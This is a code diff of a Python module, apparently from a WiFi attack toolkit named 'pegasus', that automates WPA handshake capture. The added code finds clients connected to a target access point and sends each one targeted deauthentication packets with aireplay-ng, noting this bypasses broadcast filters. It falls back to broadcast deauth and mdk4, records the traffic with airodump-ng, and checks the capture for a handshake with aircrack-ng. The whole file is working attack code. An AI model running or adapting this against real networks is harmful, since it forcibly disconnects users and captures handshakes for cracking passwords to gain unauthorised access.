@@ -1,286 +1,288 @@
-# File: engines/handshake_capture.py
 import subprocess
 import time
 import os
 import re
+import csv
+import io
 from pathlib import Path
 from core.error_handler import ErrorHandler
+
+
+HANDSHAKE_DIR = Path("/tmp/pegasus_handshakes")
+
 
 class HandshakeCapture:
     def __init__(self, config, error_handler):
         self.config = config
         self.error_handler = error_handler
-        self.capture_file = '/tmp/pegasus_handshake'
-        
-    def find_existing_handshake(self, target_bssid, search_dirs=['/tmp', './hs', '.', '/root', 'hs']):
-        """
-        Look for existing handshake files for this target
-        """
-        print("   🔍 Searching for existing handshake files...")
-        
-        handshake_patterns = [
-            f'*{target_bssid.replace(":", "-")}*.cap',
-            f'*handshake*{target_bssid.replace(":", "")}*.cap',
-            f'*{target_bssid.replace(":", "")}*.cap',
-            f'*{target_bssid.replace(":", "_")}*.cap',
-            '*.cap'  # Any capture file
-        ]
-        
-        for search_dir in search_dirs:
-            if not os.path.exists(search_dir):
+        self.capture_file = "/tmp/pegasus_handshake"
+        self.active_clients = []
+        self._airodump_process = None
+        HANDSHAKE_DIR.mkdir(parents=True, exist_ok=True)
+
+    def find_existing_handshake(self, target_bssid, search_dirs=None):
+        if search_dirs is None:
+            search_dirs = ["/tmp", "./hs", ".", str(HANDSHAKE_DIR)]
+        bssid_norm = target_bssid.replace(":", "").lower()
+
+        for sd in search_dirs:
+            if not os.path.exists(sd):
                 continue
-                
-            for pattern in handshake_patterns:
-                for file_path in Path(search_dir).glob(pattern):
-                    if os.path.getsize(file_path) > 1000:  # Reasonable file size
-                        print(f"   ✅ Found existing handshake: {file_path}")
-                        if self._verify_handshake(str(file_path)):
-                            return str(file_path)
-        
-        print("   ❌ No existing handshake files found")
+            for f in Path(sd).rglob("*.cap"):
+                if f.stat().st_size < 1000:
+                    continue
+                if bssid_norm in f.stem.lower().replace("-", "").replace("_", ""):
+                    if self._verify_handshake(str(f)):
+                        return str(f)
+            for f in Path(sd).rglob("*.pcap"):
+                if f.stat().st_size < 1000:
+                    continue
+                if bssid_norm in f.stem.lower().replace("-", "").replace("_", ""):
+                    if self._verify_handshake(str(f)):
+                        return str(f)
         return None
 
-    def capture_handshake(self, target_bssid, target_channel, interface='wlan0mon', timeout=180):
-        """
-        Capture WPA handshake by deauthenticating clients and monitoring
-        """
-        print(f"🎯 Attempting to capture handshake for {target_bssid}...")
-        print(f"   📡 Channel: {target_channel}, Interface: {interface}")
-        print(f"   ⏱️  Timeout: {timeout} seconds")
-        
-        # Ensure we're using monitor mode interface
-        if not interface.endswith('mon'):
-            print(f"   ⚠️  Warning: Using {interface} instead of monitor mode interface")
-        
+    def capture_handshake(self, target_bssid, target_channel,
+                          interface="wlan0mon", timeout=180):
+        print(f"   Target: {target_bssid}  Channel: {target_channel}")
+        self.cleanup_capture_files()
+        bssid_clean = target_bssid.replace(":", "").lower()
+        self.capture_file = f"/tmp/pegasus_hs_{bssid_clean}"
+
+        # Step 1: Quick pre-scan to find active clients
+        active_clients = self._scan_active_clients(target_bssid, target_channel, interface)
+        print(f"   Active clients found: {len(active_clients)}")
+
+        # Step 2: Start airodump-ng capture in background
+        cap_path = f"{self.capture_file}-01.cap"
+        airodump_cmd = [
+            "sudo", "airodump-ng",
+            "--bssid", target_bssid,
+            "--channel", str(target_channel),
+            "--write", self.capture_file,
+            "--output-format", "cap",
+            interface,
+        ]
         try:
-            # Clean up any previous capture files
-            self.cleanup_capture_files()
-            
-            # Start airodump-ng to monitor for handshakes
-            airodump_cmd = [
-                'sudo', 'airodump-ng',
-                '--bssid', target_bssid,
-                '--channel', str(target_channel),
-                '--write', self.capture_file,
-                '--output-format', 'cap',
-                interface
-            ]
-            
-            print(f"   📊 Starting capture: {' '.join(airodump_cmd)}")
-            airodump_process = subprocess.Popen(
-                airodump_cmd,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True
+            self._airodump_process = subprocess.Popen(
+                airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
             )
-            
-            # Wait for airodump to start
-            time.sleep(5)
-            
-            # Send deauthentication packets to trigger handshake
-            deauth_success = self._send_deauth_packets(target_bssid, interface)
-            
-            if not deauth_success:
-                print("   ⚠️  Deauthentication failed, but continuing capture...")
-                print("   💡 Handshake may still be captured from existing client activity")
-            
-            # Monitor for handshake with better progress tracking
-            handshake_captured = self._monitor_for_handshake_with_progress(timeout)
-            
-            # Stop airodump
-            airodump_process.terminate()
-            try:
-                airodump_process.wait(timeout=5)
-            except subprocess.TimeoutExpired:
-                airodump_process.kill()
-                airodump_process.wait()
-            
-            if handshake_captured:
-                print("   ✅ WPA Handshake captured successfully!")
-                handshake_file = f"{self.capture_file}-01.cap"
-                # Verify the handshake is valid
-                if self._verify_handshake(handshake_file):
-                    return handshake_file
-                else:
-                    print("   ❌ Captured file doesn't contain valid handshake")
-                    return None
-            else:
-                print("   ❌ Failed to capture handshake within timeout")
-                print("   💡 Tips:")
-                print("      • Ensure target has active clients")
-                print("      • Try different deauth methods") 
-                print("      • Increase timeout duration")
-                print("      • Move closer to target for better signal")
-                return None
-                
         except Exception as e:
-            self.error_handler.handle_error('E202', f"Handshake capture failed for {target_bssid}", e)
+            self.error_handler.handle_error("E202", "airodump-ng failed to start", e)
             return None
-    
-    def _send_deauth_packets(self, target_bssid, interface, count=20):
-        """
-        Send deauthentication packets to trigger handshake
-        """
-        try:
-            print("   📡 Sending deauthentication packets...")
-            
-            # Ensure we're using monitor mode interface
-            if not interface.endswith('mon'):
-                print(f"   ⚠️  WARNING: Using {interface} for deauth - should be monitor mode!")
-            
-            # Try multiple deauth methods
-            deauth_commands = [
-                # Method 1: Standard deauth
-                ['sudo', 'aireplay-ng', '--deauth', str(count), '-a', target_bssid, interface],
-                # Method 2: Deauth with ignore negative one
-                ['sudo', 'aireplay-ng', '--deauth', str(count), '-a', target_bssid, '--ignore-negative-one', interface],
-                # Method 3: Broadcast deauth (affects all clients)
-                ['sudo', 'aireplay-ng', '--deauth', '5', '-a', target_bssid, '-c', 'FF:FF:FF:FF:FF:FF', interface],
-            ]
-            
-            # Add mdk4 if available
+
+        time.sleep(3)
+
+        # Step 3: Send targeted deauth to each active client
+        deauth_ok = False
+        for client in active_clients:
+            if self._send_targeted_deauth(target_bssid, client, interface):
+                deauth_ok = True
+                time.sleep(1)
+
+        if not deauth_ok and active_clients:
+            print(f"   Targeted deauth failed, trying mixed strategies...")
+            self._send_mixed_deauth(target_bssid, interface)
+
+        if not active_clients:
+            print(f"   No active clients found, using broadcast deauth")
+            self._send_mixed_deauth(target_bssid, interface)
+
+        # Step 4: Dynamic handshake monitoring loop
+        handshake_ok = self._dynamic_handshake_wait(cap_path, timeout)
+
+        # Cleanup
+        if self._airodump_process:
+            self._airodump_process.terminate()
             try:
-                result = subprocess.run(['which', 'mdk4'], capture_output=True, text=True)
-                if result.returncode == 0:
-                    deauth_commands.append(['sudo', 'mdk4', interface, 'd', '-b', f'{target_bssid}'])
-                    print("   🔧 MDK4 available - will try as fallback")
-            except:
-                pass
-            
-            success_count = 0
-            for deauth_cmd in deauth_commands:
+                self._airodump_process.wait(timeout=5)
+            except subprocess.TimeoutExpired:
+                self._airodump_process.kill()
+
+        if handshake_ok and os.path.exists(cap_path):
+            # Verify with wpaclean if available
+            verified = self._wpaclean_verify(cap_path, target_bssid)
+            if verified:
+                print(f"   Handshake validated: {cap_path}")
+                return cap_path
+            if self._verify_handshake(cap_path):
+                return cap_path
+        return None
+
+    def _scan_active_clients(self, bssid, channel, interface, scan_time=12):
+        """Quick scan to find active clients connected to the target AP."""
+        clients = []
+        csv_file = f"/tmp/pegasus_clientscan_{int(time.time())}"
+
+        cmd = [
+            "sudo", "airodump-ng",
+            "--bssid", bssid,
+            "--channel", str(channel),
+            "--write", csv_file,
+            "--output-format", "csv",
+            interface,
+        ]
+        try:
+            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(scan_time)
+            proc.terminate()
+            proc.wait(timeout=5)
+
+            csv_path = f"{csv_file}-01.csv"
+            if os.path.exists(csv_path):
+                with open(csv_path) as f:
+                    in_stations = False
+                    for line in f:
+                        if "Station MAC" in line or "BSSID" in line:
+                            in_stations = True
+                            continue
+                        if in_stations and line.strip():
+                            parts = line.strip().split(",")
+                            if len(parts) >= 6:
+                                mac = parts[0].strip()
+                                if re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", mac):
+                                    if mac.upper() != bssid.upper():
+                                        clients.append(mac)
+        except Exception:
+            pass
+        finally:
+            for p in [f"{csv_file}-01.csv", f"{csv_file}-01.cap",
+                       f"{csv_file}-01.netxml"]:
                 try:
-                    print(f"   🔧 Trying: {' '.join(deauth_cmd)}")
-                    process = subprocess.run(
-                        deauth_cmd,
-                        capture_output=True,
-                        text=True,
-                        timeout=15
-                    )
-                    
-                    if process.returncode == 0:
-                        print("   ✅ Deauthentication packets sent successfully")
-                        success_count += 1
-                        # Don't break - try multiple methods for better coverage
-                    else:
-                        if process.stderr:
-                            error_msg = process.stderr.strip()
-                            if "Network is down" in error_msg:
-                                print(f"   ❌ Interface issue: {error_msg}")
-                            else:
-                                print(f"   ❌ Deauth failed: {error_msg}")
-                        else:
-                            print(f"   ❌ Deauth failed (no error output)")
-                        
-                except subprocess.TimeoutExpired:
-                    print("   ⏱️  Deauth command timeout (may still have worked)")
-                    success_count += 1
-                except Exception as e:
-                    print(f"   ⚠️  Deauth method failed: {e}")
-                    continue
-            
-            return success_count > 0
-                
-        except Exception as e:
-            self.error_handler.handle_error('E202', f"Deauthentication failed for {target_bssid}", e)
-            return False
-    
-    def _monitor_for_handshake_with_progress(self, timeout):
-        """Monitor for handshake with detailed progress"""
-        print("   🔍 Monitoring for handshake...")
-        
-        start_time = time.time()
-        cap_file = f"{self.capture_file}-01.cap"
-        last_size = 0
-        file_growing = False
-        
-        while time.time() - start_time < timeout:
-            # Check if handshake file exists and has data
-            if os.path.exists(cap_file):
-                current_size = os.path.getsize(cap_file)
-                
-                # Show file growth
-                if current_size > last_size:
-                    file_growing = True
-                    print(f"   📈 Capture file growing: {current_size} bytes", end='\r')
-                    last_size = current_size
-                elif current_size == last_size and file_growing:
-                    print(f"   📊 Capture file stable: {current_size} bytes", end='\r')
-                
-                # Verify it contains a handshake
-                if current_size > 5000 and self._verify_handshake(cap_file):
-                    print("")  # New line after progress
-                    print("   ✅ Valid handshake detected in capture file!")
+                    os.remove(p)
+                except OSError:
+                    pass
+
+        return clients[:10]  # Max 10 clients
+
+    def _send_targeted_deauth(self, bssid, client_mac, interface, count=8):
+        """Send deauth targeting a specific connected client (bypasses broadcast filters)."""
+        strategies = [
+            ["sudo", "aireplay-ng", "--deauth", str(count),
+             "-a", bssid, "-c", client_mac, interface],
+            ["sudo", "aireplay-ng", "--deauth", str(count),
+             "-a", bssid, "-c", client_mac, "--ignore-negative-one", interface],
+        ]
+        for cmd in strategies:
+            try:
+                r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+                if r.returncode == 0:
                     return True
-            
-            # Progress update every 10 seconds
-            elapsed = int(time.time() - start_time)
-            if elapsed % 10 == 0:
-                remaining = timeout - elapsed
-                status = "📈 Growing" if file_growing else "⏳ Waiting"
-                print(f"   {status} - {elapsed}/{timeout}s ({remaining}s remaining)")
-            
-            time.sleep(2)
-        
-        print("")  # New line after progress
+            except Exception:
+                continue
         return False
-    
-    def _verify_handshake(self, cap_file):
-        """
-        Verify that the capture file contains a valid handshake
-        """
+
+    def _send_mixed_deauth(self, bssid, interface, count=15):
+        """Fallback: try multiple deauth methods."""
+        methods = [
+            ["sudo", "aireplay-ng", "--deauth", str(count), "-a", bssid, interface],
+            ["sudo", "aireplay-ng", "--deauth", str(count), "-a", bssid,
+             "--ignore-negative-one", interface],
+            ["sudo", "aireplay-ng", "--deauth", "5", "-a", bssid,
+             "-c", "FF:FF:FF:FF:FF:FF", interface],
+        ]
         try:
-            if not os.path.exists(cap_file):
-                return False
-                
-            file_size = os.path.getsize(cap_file)
-            if file_size < 1000:
-                return False
-            
-            verify_cmd = [
-                'aircrack-ng',
-                cap_file
-            ]
-            
-            process = subprocess.run(
-                verify_cmd,
-                capture_output=True,
-                text=True,
-                timeout=10
-            )
-            
-            # Look for handshake indication in output
-            if 'WPA (1 handshake)' in process.stdout:
-                return True
-            elif 'WPA (0 handshake)' in process.stdout:
-                print("   ❌ Capture file exists but contains 0 handshakes")
-                return False
+            r = subprocess.run(["which", "mdk4"], capture_output=True, text=True, timeout=3)
+            if r.returncode == 0:
+                methods.append(["sudo", "mdk4", interface, "d", "-b", bssid])
+        except Exception:
+            pass
+
+        for cmd in methods:
+            try:
+                subprocess.run(cmd, capture_output=True, text=True, timeout=12)
+            except Exception:
+                continue
+
+    def _dynamic_handshake_wait(self, cap_path, timeout):
+        """Dynamic loop: checks every 2s, validates instantly with aircrack-ng."""
+        print(f"   Monitoring for handshake (timeout={timeout}s)...")
+        start = time.time()
+        last_size = 0
+        stable_cycles = 0
+
+        while time.time() - start < timeout:
+            elapsed = int(time.time() - start)
+            remaining = timeout - elapsed
+
+            if os.path.exists(cap_path):
+                size = os.path.getsize(cap_path)
+
+                if size > last_size:
+                    stable_cycles = 0
+                    print(f"   File growing: {size} bytes  ({elapsed}s/{remaining}s remaining)", end="\r")
+                    last_size = size
+                else:
+                    stable_cycles += 1
+                    print(f"   File stable:  {size} bytes  ({elapsed}s/{remaining}s remaining)", end="\r")
+
+                if size > 4000:
+                    if self._verify_handshake(cap_path):
+                        print("\n   Handshake detected!")
+                        return True
             else:
-                # If we can't determine, check file characteristics
-                if file_size > 10000:  # Reasonable size for capture
-                    print("   ⚠️  Cannot verify handshake, but file looks promising")
-                    return True
-                return False
-                
-        except Exception as e:
-            print(f"   ⚠️  Handshake verification failed: {e}")
-            # If verification fails, use file size as fallback
-            return os.path.getsize(cap_file) > 10000
-    
-    def cleanup_capture_files(self):
-        """Clean up handshake capture files"""
+                print(f"   Waiting for capture file... ({elapsed}s/{remaining}s)", end="\r")
+
+            time.sleep(2)
+
+        print("\n   Handshake timeout reached")
+        return False
+
+    def _wpaclean_verify(self, cap_path, bssid):
+        """Use wpaclean to extract and validate handshake (instant check)."""
         try:
+            r = subprocess.run(["which", "wpaclean"], capture_output=True, text=True, timeout=3)
+            if r.returncode != 0:
+                return None
+
+            out = f"/tmp/pegasus_wpaclean_{int(time.time())}.cap"
+            result = subprocess.run(
+                ["wpaclean", out, cap_path],
+                capture_output=True, text=True, timeout=15,
+            )
+            if os.path.exists(out) and os.path.getsize(out) > 500:
+                clean_size = os.path.getsize(out)
+                os.remove(out)
+                print(f"   wpaclean validated: {clean_size} bytes")
+                return True
+            try:
+                os.remove(out)
+            except OSError:
+                pass
+            return False
+        except Exception:
+            return None
+
+    def _verify_handshake(self, cap_file):
+        try:
+            if not os.path.exists(cap_file) or os.path.getsize(cap_file) < 1000:
+                return False
+            r = subprocess.run(
+                ["aircrack-ng", cap_file],
+                capture_output=True, text=True, timeout=10,
+            )
+            if "WPA (1 handshake)" in r.stdout:
+                return True
+            return False
+        except Exception:
+            return False
+
+    def cleanup_capture_files(self):
+        base = self.capture_file
+        if base == "/tmp/pegasus_handshake":
             patterns = [
-                f"{self.capture_file}-01.cap",
-                f"{self.capture_file}-01.csv", 
-                f"{self.capture_file}-01.netxml",
-                f"{self.capture_file}-01.kismet.csv",
-                f"{self.capture_file}-01.kismet.netxml"
+                "/tmp/pegasus_handshake-01.cap",
+                "/tmp/pegasus_handshake-01.csv",
+                "/tmp/pegasus_handshake-01.netxml",
             ]
-            
-            for pattern in patterns:
-                if os.path.exists(pattern):
-                    os.remove(pattern)
-                    print(f"   🧹 Cleaned up: {pattern}")
-        except Exception as e:
-            print(f"   ⚠️  Cleanup warning: {e}")
+        else:
+            patterns = [
+                f"{base}-01.cap", f"{base}-01.csv", f"{base}-01.netxml",
+                f"{base}-01.kismet.csv", f"{base}-01.kismet.netxml",
+            ]
+        for p in patterns:
+            try:
+                if os.path.exists(p):
+                    os.remove(p)
+            except OSError:
+                pass
